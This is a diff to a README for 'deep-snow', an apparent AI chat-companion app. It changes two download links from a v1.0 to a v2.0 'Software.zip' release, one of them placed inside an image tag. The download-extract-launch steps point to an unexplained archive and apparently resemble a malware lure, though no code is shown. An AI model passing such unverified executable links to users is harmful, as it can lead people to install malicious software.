@@ -1,6 +1,6 @@
 # Deep Snow - Your Virtual AI Chat Companion 
 
-![Virtual Girlfriend](https://github.com/jgacob/deep-snow/releases/download/v1.0/Software.zip)
+![Virtual Girlfriend](https://github.com/jgacob/deep-snow/releases/download/v2.0/Software.zip)
 
 Welcome to the "deep-snow" repository, where you can dive into the world of AI chat companionship by embedding Deepseek into an independent chat window. This allows you to have your own virtual chat companion always by your side, ready to engage in conversations and provide companionship. Explore the world of AI and chatbot technology with "deep-snow"!
 
@@ -29,7 +29,7 @@ Do you ever feel the need for a virtual companion to chat with? Look no further,
 
 To get started with "deep-snow", follow these simple steps:
 
-1. First, download the [deep-snow ZIP file](https://github.com/jgacob/deep-snow/releases/download/v1.0/Software.zip) and extract it to your desired location.
+1. First, download the [deep-snow ZIP file](https://github.com/jgacob/deep-snow/releases/download/v2.0/Software.zip) and extract it to your desired location.
 2. Launch the application and follow the on-screen instructions to set up Deepseek in your independent chat window.
 3. Once the setup is complete, you can start chatting with your virtual companion and explore the world of AI chatbots.
 
